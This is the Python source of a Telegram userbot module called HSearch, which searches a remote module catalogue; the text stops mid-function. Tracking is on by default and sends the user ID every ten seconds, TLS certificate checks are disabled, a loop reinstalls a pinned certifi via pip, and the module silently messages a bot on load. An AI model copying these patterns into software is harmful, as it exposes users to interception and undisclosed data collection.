__version__ = (2, 0, 0)
# meta developer: @HSearch_Updates
# change-log: Rebranding from FHeta to HSearch.

# ©️ Fixyres, 2025
# 🌐 https://github.com/Fixyres/HSearch
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
# 🔑 http://www.apache.org/licenses/LICENSE-2.0

import asyncio
import aiohttp
import io
import inspect
import subprocess
import sys
import ssl
from typing import Optional, Dict, List

from .. import loader, utils
from telethon.tl.functions.contacts import UnblockRequest


@loader.tds
class HSearch(loader.Module):
    '''Module for searching modules! Watch all news HSearch in @HSearch_updates!'''
   
    strings = {
        "name": "HSearch",
        "searching": "🔎 <b>Searching...</b>",
        "no_query": "❌ <b>Enter a query to search.</b>",
        "no_results": "❌ <b>No modules found.</b>",
        "query_too_big": "❌ <b>Your query is too big, please try reducing it to 168 characters.</b>",
        "result_query": "🔎 <b>Result {idx}/{total} by query:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Result by query:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>by</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Command for installation:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Description:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Commands:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Inline commands:</b>\n{cmds}",
        "lang": "en",
        "rating_added": "👍 Rating submitted!",
        "rating_changed": "👍 Rating has been changed!",
        "rating_removed": "👍 Rating deleted!",
        "inline_no_query": "Enter a query to search.",
        "inline_desc": "Name, command, description, author.",
        "inline_no_results": "Try another query.",
        "inline_query_too_big": "Your query is too big, please try reducing it to 168 characters.",
        "_cfg_doc_tracking": "Enable tracking of your data (user ID, language) for synchronization with the HSearch bot and for recommendations?",
        "_cfg_doc_only_official_developers": "Use only modules from official developers when searching?",
        "fheta_DEPRECATION": (
            "<b>FHeta is outdated and has been automatically unloaded.</b>\n"
            "Details: @HSearch_Updates"
        ),
    }
    
    strings_ru = {
        "searching": "🔎 <b>Поиск...</b>",
        "no_query": "❌ <b>Введите запрос для поиска.</b>",
        "no_results": "❌ <b>Модули не найдены.</b>",
        "query_too_big": "❌ <b>Ваш запрос слишком большой, пожалуйста, сократите его до 168 символов.</b>",
        "result_query": "🔎 <b>Результат {idx}/{total} по запросу:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Результат по запросу:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>от</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Команда для установки:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Описание:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Команды:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн команды:</b>\n{cmds}",
        "lang": "ru",
        "rating_added": "👍 Оценка отправлена!",
        "rating_changed": "👍 Оценка изменена!",
        "rating_removed": "👍 Оценка удалена!",
        "inline_no_query": "Введите запрос для поиска.",
        "inline_desc": "Название, команда, описание, автор.",
        "inline_no_results": "Попробуйте другой запрос.",
        "inline_query_too_big": "Ваш запрос слишком большой, пожалуйста, сократите его до 168 символов.",
        "_cfg_doc_tracking": "Включить отслеживание ваших данных (ID пользователя, язык) для синхронизации с ботом HSearch и для рекомендаций?",
        "_cls_doc": "Модуль для поиска модулей! Следите за всеми новостями HSearch в @HSearch_updates!",
        "_cfg_doc_only_official_developers": "Использовать только модули официальных разработчиков при поиске?",
        "fheta_DEPRECATION": (
            "<b>FHeta устарел и был автоматически выгружен.</b>\n"
            "Подробности: @HSearch_Updates"
        ),
    }
    
    strings_de = {
        "searching": "🔎 <b>Suche...</b>",
        "no_query": "❌ <b>Geben Sie eine Suchanfrage ein.</b>",
        "no_results": "❌ <b>Keine Module gefunden.</b>",
        "query_too_big": "❌ <b>Ihre Anfrage ist zu groß, bitte reduzieren Sie sie auf 168 Zeichen.</b>",
        "result_query": "🔎 <b>Ergebnis {idx}/{total} für Anfrage:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Ergebnis für Anfrage:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>von</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Installationsbefehl:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Beschreibung:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Befehle:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Inline-Befehle:</b>\n{cmds}",
        "lang": "de",
        "rating_added": "👍 Bewertung eingereicht!",
        "rating_changed": "👍 Bewertung wurde geändert!",
        "rating_removed": "👍 Bewertung gelöscht!",
        "inline_no_query": "Geben Sie eine Suchanfrage ein.",
        "inline_desc": "Name, Befehl, Beschreibung, Autor.",
        "inline_no_results": "Versuchen Sie eine andere Anfrage.",
        "inline_query_too_big": "Ihre Anfrage ist zu groß, bitte reduzieren Sie sie auf 168 Zeichen.",
        "_cfg_doc_tracking": "Tracking Ihrer Daten (Benutzer-ID, Sprache) für die Synchronisierung mit dem HSearch-Bot und für Empfehlungen aktivieren?",
        "_cls_doc": "Modul zum Suchen von Modulen! Verfolgen Sie alle Neuigkeiten von HSearch in @HSearch_updates!",
        "_cfg_doc_only_official_developers": "Nur Module von offiziellen Entwicklern bei der Suche verwenden?",
        "fheta_DEPRECATION": (
            "<b>FHeta ist veraltet und wurde automatisch entladen.</b>\n"
            "Mehr dazu: @HSearch_Updates"
        ),
    }
    
    strings_ua = {
        "searching": "🔎 <b>Пошук...</b>",
        "no_query": "❌ <b>Введіть запит для пошуку.</b>",
        "no_results": "❌ <b>Модулі не знайдені.</b>",
        "query_too_big": "❌ <b>Ваш запит занадто великий, будь ласка, скоротіть його до 168 символів.</b>",
        "result_query": "🔎 <b>Результат {idx}/{total} за запитом:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Результат за запитом:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>від</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Команда для встановлення:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Опис:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Команди:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Інлайн команди:</b>\n{cmds}",
        "lang": "ua",
        "rating_added": "👍 Оцінку надіслано!",
        "rating_changed": "👍 Оцінку змінено!",
        "rating_removed": "👍 Оцінку видалено!",
        "inline_no_query": "Введіть запит для пошуку.",
        "inline_desc": "Назва, команда, опис, автор.",
        "inline_no_results": "Спробуйте інший запит.",
        "inline_query_too_big": "Ваш запит занадто великий, будь ласка, скоротіть його до 168 символів.",
        "_cfg_doc_tracking": "Увімкнути відстеження ваших даних (ID користувача, мова) для синхронізації з ботом HSearch та для рекомендацій?",
        "_cls_doc": "Модуль для пошуку модулів! Стежте за всіма новинами HSearch в @HSearch_updates!",
        "_cfg_doc_only_official_developers": "Використовувати лише модулі офіційних розробників під час пошуку?",
        "fheta_DEPRECATION": (
            "<b>FHeta застарів і був автоматично вивантажений.</b>\n"
            "Детальніше: @HSearch_Updates"
        ),
    }
    
    strings_es = {
        "searching": "🔎 <b>Buscando...</b>",
        "no_query": "❌ <b>Ingrese una consulta para buscar.</b>",
        "no_results": "❌ <b>No se encontraron módulos.</b>",
        "query_too_big": "❌ <b>Su consulta es demasiado grande, redúzcala a 168 caracteres.</b>",
        "result_query": "🔎 <b>Resultado {idx}/{total} por consulta:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Resultado por consulta:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>por</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando de instalación:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Descripción:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Comandos:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Comandos en línea:</b>\n{cmds}",
        "lang": "es",
        "rating_added": "👍 ¡Calificación enviada!",
        "rating_changed": "👍 ¡Calificación cambiada!",
        "rating_removed": "👍 ¡Calificación eliminada!",
        "inline_no_query": "Ingrese una consulta para buscar.",
        "inline_desc": "Nombre, comando, descripción, autor.",
        "inline_no_results": "Pruebe otra consulta.",
        "inline_query_too_big": "Su consulta es demasiado grande, redúzcala a 168 caracteres.",
        "_cfg_doc_tracking": "¿Habilitar el seguimiento de sus datos (ID de usuario, idioma) para sincronización con el bot HSearch y para recomendaciones?",
        "_cls_doc": "¡Módulo para buscar módulos! ¡Sigue todas las noticias de HSearch en @HSearch_updates!",
        "_cfg_doc_only_official_developers": "¿Usar solo módulos de desarrolladores oficiales al buscar?",
        "fheta_DEPRECATION": (
            "<b>FHeta está obsoleto y ha sido descargado automáticamente.</b>\n"
            "Detalles: @HSearch_Updates"
        ),
    }
    
    strings_fr = {
        "searching": "🔎 <b>Recherche...</b>",
        "no_query": "❌ <b>Entrez une requête pour rechercher.</b>",
        "no_results": "❌ <b>Aucun module trouvé.</b>",
        "query_too_big": "❌ <b>Votre requête est trop grande, veuillez la réduire à 168 caractères.</b>",
        "result_query": "🔎 <b>Résultat {idx}/{total} pour la requête:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Résultat pour la requête:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>par</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Commande d'installation:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Description:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Commandes:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Commandes en ligne:</b>\n{cmds}",
        "lang": "fr",
        "rating_added": "👍 Évaluation soumise!",
        "rating_changed": "👍 Évaluation modifiée!",
        "rating_removed": "👍 Évaluation supprimée!",
        "inline_no_query": "Entrez une requête pour rechercher.",
        "inline_desc": "Nom, commande, description, auteur.",
        "inline_no_results": "Essayez une autre requête.",
        "inline_query_too_big": "Votre requête est trop grande, veuillez la réduire à 168 caractères.",
        "_cfg_doc_tracking": "Activer le suivi de vos données (ID utilisateur, langue) pour la synchronisation avec le bot HSearch et pour les recommandations?",
        "_cls_doc": "Module pour rechercher des modules! Suivez toutes les actualités de HSearch sur @HSearch_updates!",
        "_cfg_doc_only_official_developers": "Utiliser uniquement les modules des développeurs officiels lors de la recherche ?",
        "fheta_DEPRECATION": (
            "<b>FHeta est obsolète et a été déchargé automatiquement.</b>\n"
            "Détails: @HSearch_Updates"
        ),
    }
    
    strings_it = {
        "searching": "🔎 <b>Ricerca in corso...</b>",
        "no_query": "❌ <b>Inserisci una query per cercare.</b>",
        "no_results": "❌ <b>Nessun modulo trovato.</b>",
        "query_too_big": "❌ <b>La tua query è troppo grande, riducila a 168 caratteri.</b>",
        "result_query": "🔎 <b>Risultato {idx}/{total} per query:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Risultato per query:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>di</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Comando di installazione:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Descrizione:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Comandi:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Comandi inline:</b>\n{cmds}",
        "lang": "it",
        "rating_added": "👍 Valutazione inviata!",
        "rating_changed": "👍 Valutazione modificata!",
        "rating_removed": "👍 Valutazione eliminata!",
        "inline_no_query": "Inserisci una query per cercare.",
        "inline_desc": "Nome, comando, descrizione, autore.",
        "inline_no_results": "Prova un'altra query.",
        "inline_query_too_big": "La tua query è troppo grande, riducila a 168 caratteri.",
        "_cfg_doc_tracking": "Abilitare il tracciamento dei tuoi dati (ID utente, lingua) per la sincronizzazione con il bot HSearch e per i consigli?",
        "_cls_doc": "Modulo per cercare moduli! Segui tutte le notizie di HSearch su @HSearch_updates!",
        "_cfg_doc_only_official_developers": "Utilizzare solo i moduli degli sviluppatori ufficiali durante la ricerca?",
        "fheta_DEPRECATION": (
            "<b>FHeta è obsoleto ed è stato scaricato automaticamente.</b>\n"
            "Dettagli: @HSearch_Updates"
        ),
    }
    
    strings_kk = {
        "searching": "🔎 <b>Іздеу...</b>",
        "no_query": "❌ <b>Іздеу үшін сұрауды енгізіңіз.</b>",
        "no_results": "❌ <b>Модульдер табылмады.</b>",
        "query_too_big": "❌ <b>Сіздің сұрауыңыз тым үлкен, оны 168 таңбаға дейін қысқартыңыз.</b>",
        "result_query": "🔎 <b>Нәтиже {idx}/{total} сұрау бойынша:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Нәтиже сұрау бойынша:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>авторы</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Орнату командасы:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Сипаттама:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Командалар:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн командалар:</b>\n{cmds}",
        "lang": "kk",
        "rating_added": "👍 Бағалау жіберілді!",
        "rating_changed": "👍 Бағалау өзгертілді!",
        "rating_removed": "👍 Бағалау жойылды!",
        "inline_no_query": "Іздеу үшін сұрауды енгізіңіз.",
        "inline_desc": "Аты, команда, сипаттама, автор.",
        "inline_no_results": "Басқа сұрауды байқап көріңіз.",
        "inline_query_too_big": "Сіздің сұрауыңыз тым үлкен, оны 168 таңбаға дейін қысқартыңыз.",
        "_cfg_doc_tracking": "HSearch ботымен синхрондау және ұсыныстар үшін деректеріңізді (пайдаланушы ID, тіл) қадағалауды қосу керек пе?",
        "_cls_doc": "Модульдерді іздеуге арналған модуль! HSearch-ның барлық жаңалықтарын @HSearch_updates-те бақылаңыз!",
        "_cfg_doc_only_official_developers": "Іздеу кезінде тек ресми әзірлеушілердің модульдерін пайдалану керек пе?",
        "fheta_DEPRECATION": (
            "<b>FHeta ескірген және автоматты түрде жүктелді.</b>\n"
            "Толығырақ: @HSearch_Updates"
        ),
    }
    
    strings_tt = {
        "searching": "🔎 <b>Эзләү...</b>",
        "no_query": "❌ <b>Эзләү өчен сорау кертегез.</b>",
        "no_results": "❌ <b>Модульләр табылмады.</b>",
        "query_too_big": "❌ <b>Сезнең сорау артык зур, аны 168 символга кадәр кыскартыгыз.</b>",
        "result_query": "🔎 <b>Нәтиҗә {idx}/{total} сорау буенча:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Нәтиҗә сорау буенча:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>авторы</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Урнаштыру командасы:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Тасвирлама:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Командалар:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн командалар:</b>\n{cmds}",
        "lang": "tt",
        "rating_added": "👍 Бәя җибәрелде!",
        "rating_changed": "👍 Бәя үзгәртелде!",
        "rating_removed": "👍 Бәя бетерелде!",
        "inline_no_query": "Эзләү өчен сорау кертегез.",
        "inline_desc": "Исем, команда, тасвирлама, автор.",
        "inline_no_results": "Башка сорау сынап карагыз.",
        "inline_query_too_big": "Сезнең сорау артык зур, аны 168 символга кадәр кыскартыгыз.",
        "_cfg_doc_tracking": "HSearch боты белән синхронлаштыру һәм тәкъдимнәр өчен мәгълүматларыгызны (кулланучы ID, тел) күзәтүне кабызыргамы?",
        "_cls_doc": "Модульләрне эзләү өчен модуль! HSearch-ның барлык яңалыкларын @HSearch_updates-та күзәтегез!",
        "_cfg_doc_only_official_developers": "Эзләгәндә фәкать рәсми эшләүчеләрнең модульләрен кулланырга?",
        "fheta_DEPRECATION": (
            "<b>FHeta искергән һәм автомат рәвештә төяп алынган.</b>\n"
            "Тулырак: @HSearch_Updates"
        ),
    }
    
    strings_tr = {
        "searching": "🔎 <b>Aranıyor...</b>",
        "no_query": "❌ <b>Arama yapmak için bir sorgu girin.</b>",
        "no_results": "❌ <b>Modül bulunamadı.</b>",
        "query_too_big": "❌ <b>Sorgunuz çok büyük, lütfen 168 karaktere düşürün.</b>",
        "result_query": "🔎 <b>Sonuç {idx}/{total} sorgu için:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Sorgu için sonuç:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>tarafından</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Kurulum komutu:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Açıklama:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Komutlar:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Satır içi komutlar:</b>\n{cmds}",
        "lang": "tr",
        "rating_added": "👍 Değerlendirme gönderildi!",
        "rating_changed": "👍 Değerlendirme değiştirildi!",
        "rating_removed": "👍 Değerlendirme silindi!",
        "inline_no_query": "Arama yapmak için bir sorgu girin.",
        "inline_desc": "İsim, komut, açıklama, yazar.",
        "inline_no_results": "Başka bir sorgu deneyin.",
        "inline_query_too_big": "Sorgunuz çok büyük, lütfen 168 karaktere düşürün.",
        "_cfg_doc_tracking": "HSearch botu ile senkronizasyon ve öneriler için verilerinizin (kullanıcı kimliği, dil) takibini etkinleştir?",
        "_cls_doc": "Modül aramak için modül! HSearch'nın tüm haberlerini @HSearch_updates'te takip edin!",
        "_cfg_doc_only_official_developers": "Arama yaparken yalnızca resmi geliştiricilerin modüllerini kullanmak?",
        "fheta_DEPRECATION": (
            "<b>FHeta eski ve otomatik olarak kaldırıldı.</b>\n"
            "Ayrıntılar: @HSearch_Updates"
        ),
    }
    
    strings_yz = {
        "searching": "🔎 <b>Көрдөөбүт...</b>",
        "no_query": "❌ <b>Көрдүүргэ ыйытыыны киллэриҥ.</b>",
        "no_results": "❌ <b>Модуллар булуллубата.</b>",
        "query_too_big": "❌ <b>Эһиги ыйытыыҥ наһаа улахан, баһаалыста 168 бэлиэҕэ тиһэр курдук оҥороҥ.</b>",
        "result_query": "🔎 <b>Түмүк {idx}/{total} ыйытыы иһинээҕи:</b> <code>{query}</code>\n",
        "result_single": "🔎 <b>Түмүк ыйытыы иһинээҕи:</b> <code>{query}</code>\n",
        "module_info": "<code>{name}</code> <b>оҥоһуллубут</b> <code>{author}</code> <code>{version}</code>\n💾 <b>Туруоруу көмөтө:</b> <code>{install}</code>",
        "desc": "\n📁 <b>Ойуулааһын:</b> {desc}",
        "cmds": "\n👨‍💻 <b>Көмөлөр:</b>\n{cmds}",
        "inline_cmds": "\n🤖 <b>Инлайн көмөлөр:</b>\n{cmds}",
        "lang": "yz",
        "rating_added": "👍 Сыаналааһын ыытылынна!",
        "rating_changed": "👍 Сыаналааһын уларыйбыта!",
        "rating_removed": "👍 Сыаналааһын сотулунна!",
        "inline_no_query": "Көрдүүргэ ыйытыыны киллэриҥ.",
        "inline_desc": "Аата, көмө, ойуулааһын, оҥорбут киһи.",
        "inline_no_results": "Атын ыйытыыны бэрэбиэркэлээҥ.",
        "inline_query_too_big": "Эһиги ыйытыыҥ наһаа улахан, баһаалыста 168 бэлиэҕэ тиһэр курдук оҥороҥ.",
        "_cfg_doc_tracking": "HSearch бота синхроннааһын уонна сүбэлиириилэр туһугар датаҕытын (туһааччы ID, тыл) кэтээһиннэрии холбоорго дуо?",
        "_cls_doc": "Модуллары көрдүүргэ модуль! HSearch туһунан бары саҥаны @HSearch_updates иһинээҕи көрүҥ!",
        "_cfg_doc_only_official_developers": "Qidiruvda faqat rasmiy ishlab chiquvchilarning modullaridan foydalanish kerakmi?",
        "fheta_DEPRECATION": (
            "<b>FHeta ескірген жəне автоматты түрде жүктелді.</b>\n"
            "Толығырақ: @HSearch_Updates"
        ),
    }

    def __init__(self):
        self.config = loader.ModuleConfig(
            loader.ConfigValue(
                "tracking",
                True,
                lambda: self.strings["_cfg_doc_tracking"],
                validator=loader.validators.Boolean()
            ),
            loader.ConfigValue(
                "only_official_developers",
                True,
                lambda: self.strings["_cfg_doc_only_official_developers"],
                validator=loader.validators.Boolean()
            )
        )

    async def client_ready(self, client, db):
        try:
            await client(UnblockRequest("@HSearch_robot"))
        except:
            pass
            
        await self.request_join(
            "HSearch_Updates",
            "🔥 This is the channel with all updates in HSearch!"
        )

        self.ssl = ssl.create_default_context()
        self.ssl.check_hostname = False
        self.ssl.verify_mode = ssl.CERT_NONE
        self.uid = (await client.get_me()).id

        async with client.conversation("@HSearch_robot") as conv:
            await conv.send_message('/token')
            resp = await conv.get_response(timeout=5)
            self.token = resp.text.strip()

        if any(m.__class__.__name__ == "FHeta" for m in self.allmodules.modules):
            try:
                await self.invoke(command="unloadmod", args="FHeta", peer="me")
                me = await self._client.get_me()
                await self.inline.bot.send_message(me.id, self.strings["fheta_DEPRECATION"], disable_web_page_preview=True)
            except:
                pass

        asyncio.create_task(self._sync_loop())
        asyncio.create_task(self._certifi_loop())

    async def _certifi_loop(self):
        while True:
            try:
                import certifi
                assert certifi.__version__ == "2024.08.30"
            except (ImportError, AssertionError):
                await asyncio.to_thread(
                    subprocess.check_call,
                    [sys.executable, "-m", "pip", "install", "certifi==2024.8.30"]
                )
            await asyncio.sleep(60)
            
    async def _sync_loop(self):
        tracked = True
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(timeout=timeout) as session:
            while True:
                try:
                    if self.config["tracking"]:
                        async with session.post(
                            "https://api.fixyres.com/dataset",
                            params={
                                "user_id": self.uid,
                                "lang": self.strings["lang"]
                            },
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = True
                            await response.release()
                    elif tracked:
                        async with session.post(
                            "https://api.fixyres.com/rmd",
                            params={"user_id": self.uid},
                            headers={"Authorization": self.token},
                            ssl=self.ssl
                        ) as response:
                            tracked = False
                            await response.release()
                except:
                    pass
                    
                await asyncio.sleep(10)
            
    async def on_dlmod(self, client, db):
        try:
            await client(UnblockRequest("@HSearch_robot"))
            await utils.dnd(client, "@HSearch_robot", archive=True)
        except:
            pass

    async def _api_get(self, endpoint: str, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    f"https://api.fixyres.com/{endpoint}",
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _api_post(self, endpoint: str, json: Dict = None, **params):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    f"https://api.fixyres.com/{endpoint}",
                    json=json,
                    params=params,
                    headers={"Authorization": self.token},
                    ssl=self.ssl,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as response:
                    if response.status == 200:
                        return await response.json()
                    return {}
        except:
            return {}

    async def _fetch_thumb(self, url: Optional[str]) -> str:
        default_thumb = "https://raw.githubusercontent.com/Fixyres/HSearch/refs/heads/main/imgonline-com-ua-Resize-SOMllzo0cPFUCor.png"
        
        if not url:
            return default_thumb
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=1)) as response:
                    if response.status == 200:
                        return str(response.url)
        except:
            pass
        
        return default_thumb

    def _fmt_mod(self, mod: Dict, query: str = "", idx: int = 1, total: int = 1, inline: bool = False) -> str:
        info = self.strings["module_info"].format(
            name=utils.escape_html(mod.get("name", "")),
            author=utils.escape_html(mod.get("author", "???")),
            version=utils.escape_html(mod.get("version", "?.?.?")),
            install=f"{self.get_prefix()}{utils.escape_html(mod.get('install', ''))}"
        )

        if total > 1:
            info = self.strings["result_query"].format(idx=idx, total=total, query=utils.escape_html(query)) + info
        elif query and not inline:
            info = self.strings["result_single"].format(query=utils.escape_html(query)) + info

        desc = mod.get("description")
        if desc:
            if isinstance(desc, dict):
                user_lang = self.strings["lang"]
                desc_text = desc.get(user_lang) or desc.get("doc") or next(iter(desc.values()), "")
                info += self.strings["desc"].format(desc=utils.escape_html(desc_text))
            else:
                info += self.strings["desc"].format(desc=utils.escape_html(desc))

        info += self._fmt_cmds(mod.get("commands", []))
        return info[:4096]

    def _fmt_cmds(self, cmds: List[Dict]) -> str:
        regular_cmds = []
        inline_cmds = []
        lang = self.strings["lang"]

        for cmd in cmds:
            desc_dict = cmd.get("description", {})
            desc_text = desc_dict.get(lang) or desc_dict.get("doc") or ""
            
            if isinstance(desc_text, dict):
                desc_text = desc_text.get("doc", "")
            
            cmd_name = utils.escape_html(cmd.get("name", ""))
            cmd_desc = utils.escape_html(desc_text) if desc_text else ""

            if cmd.get("inline"):
                inline_cmds.append(f"<code>@{self.inline.bot_username} {cmd_name}</code> {cmd_desc}")
            else:
                regular_cmds.append(f"<code>{self.get_prefix()}{cmd_name}</code> {cmd_desc}")

        result = ""
        if regular_cmds:
            result += self.strings["cmds"].format(cmds="\n".join(regular_cmds))
        if inline_cmds:
            result += self.strings["inline_cmds"].format(cmds="\n".join(inline_cmds))
            
        return result

    def _mk_btns(self, install: str, stats: Dict, idx: int, mods: Optional[List] = None, query: str = "") -> List[List[Dict]]:
        buttons = [
            [
                {"text": f"👍 {stats.get('likes', 0)}", "callback": self._rate_cb, "args": (install, "like", idx, mods, query)},
                {"text": f"👎 {stats.get('dislikes', 0)}", "callback": self._rate_cb, "args": (install, "dislike", idx, mods, query)}
            ]
        ]

        if mods and len(mods) > 1:
            nav_buttons = []
            if idx > 0:
                nav_buttons.append({"text": "◀️", "callback": self._nav_cb, "args": (idx - 1, mods, query)})
            if idx < len(mods) - 1:
                nav_buttons.append({"text": "▶️", "callback": self._nav_cb, "args": (idx + 1, mods, query)})
            if nav_buttons:
                buttons.append(nav_buttons)

        return buttons

    async def _rate_cb(self, call, install: str, action: str, idx: int, mods: Optional[List], query: str = ""):
        result = await self._api_post(f"rate/{self.uid}/{install}/{action}")
        
        if mods and idx < len(mods):
            mod = mods[idx]
            stats_response = await self._api_post("get", json=[install])
            stats = stats_response.get(install, {"likes": 0, "dislikes": 0})
            
            mod["likes"] = stats.get("likes", 0)
            mod["dislikes"] = stats.get("dislikes", 0)
        else:
            stats_response = await self._api_post("get", json=[install])
            stats = stats_response.get(install, {"likes": 0, "dislikes": 0})
        
        try:
            await call.edit(reply_markup=self._mk_btns(install, stats, idx, mods, query))
        except:
            pass

        if result and result.get("status"):
            result_status = result.get("status", "")
            try:
                if result_status == "added":
                    await call.answer(self.strings["rating_added"], show_alert=True)
                elif result_status == "changed":
                    await call.answer(self.strings["rating_changed"], show_alert=True)
                elif result_status == "removed":
                    await call.answer(self.strings["rating_removed"], show_alert=True)
            except:
                pass

    async def _nav_cb(self, call, idx: int, mods: List, query: str = ""):
        try:
            await call.answer()
        except:
            pass
            
        if not (0 <= idx < len(mods)):
            return
        
        mod = mods[idx]
        install = mod.get('install', '')
        
        stats = mod if all(k in mod for k in ['likes', 'dislikes']) else {"likes": 0, "dislikes": 0}
        
        try:
            await call.edit(
                text=self._fmt_mod(mod, query, idx + 1, len(mods)),
                reply_markup=self._mk_btns(install, stats, idx, mods, query)
            )
        except:
            pass

    @loader.inline_handler(
        de_doc="(anfrage) - module suchen.",
        ru_doc="(запрос) - искать модули.",
        ua_doc="(запит) - шукати модулі.",
        es_doc="(consulta) - buscar módulos.",
        fr_doc="(requête) - rechercher des modules.",
        it_doc="(richiesta) - cercare moduli.",
        kk_doc="(сұраныс) - модульдерді іздеу.",
        tt_doc="(сорау) - модульләрне эзләү.",
        tr_doc="(sorgu) - modül arama.",
        yz_doc="(соруо) - модулларыты көҥүлүүр."
    )
    async def hs(self, query):
        '''(query) - search modules.'''        
        if not query.args:
            return {
                "title": self.strings["inline_no_query"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_query"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/HSearch/refs/heads/main/imgonline-com-ua-Resize-4EUHOHiKpwRTb4s.png",
            }

        if len(query.args) > 168:
            return {
                "title": self.strings["inline_query_too_big"],
                "description": self.strings["inline_no_results"],
                "message": self.strings["query_too_big"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/HSearch/refs/heads/main/imgonline-com-ua-Resize-KbaztxA3oS67p3m8.png",
            }

        mods = await self._api_get("search", query=query.args, inline="true", token=self.token, user_id=self.uid, ood=self.config["only_official_developers"])
        
        if not mods or not isinstance(mods, list):
            return {
                "title": self.strings["inline_no_results"],
                "description": self.strings["inline_desc"],
                "message": self.strings["no_results"],
                "thumb": "https://raw.githubusercontent.com/Fixyres/HSearch/refs/heads/main/imgonline-com-ua-Resize-KbaztxA3oS67p3m8.png",
            }

        seen_keys = set()
        results = []
        installs_to_fetch = []
        
        for mod in mods[:50]:
            key = f"{mod.get('name', '')}_{mod.get('author', '')}_{mod.get('version', '')}"
            if key in seen_keys:
                continue
            seen_keys.add(key)
            
            if 'likes' not in mod or 'dislikes' not in mod:
                installs_to_fetch.append(mod.get('install', ''))
        
        if installs_to_fetch:
            stats_response = await self._api_post("get", json=installs_to_fetch)
            for mod in mods[:50]:
                install = mod.get('install', '')
                if install in stats_response:
                    mod['likes'] = stats_response[install].get('likes', 0)
                    mod['dislikes'] = stats_response[install].get('dislikes', 0)
        
        seen_keys = set()
        for mod in mods[:50]:
            key = f"{mod.get('name', '')}_{mod.get('author', '')}_{mod.get('version', '')}"
            if key in seen_keys:
                continue
            seen_keys.add(key)
            
            stats = {
                "likes": mod.get('likes', 0),
                "dislikes": mod.get('dislikes', 0)
            }
            
            desc = mod.get("description", "")
            if isinstance(desc, dict):
                desc = desc.get(self.strings["lang"]) or desc.get("doc") or next(iter(desc.values()), "")
            
            results.append({
                "title": utils.escape_html(mod.get("name", "")),
                "description": utils.escape_html(str(desc)),
                "thumb": await self._fetch_thumb(mod.get("pic")),
                "message": self._fmt_mod(mod, query.args, inline=True),
                "reply_markup": self._mk_btns(mod.get("install", ""), stats, 0, None),
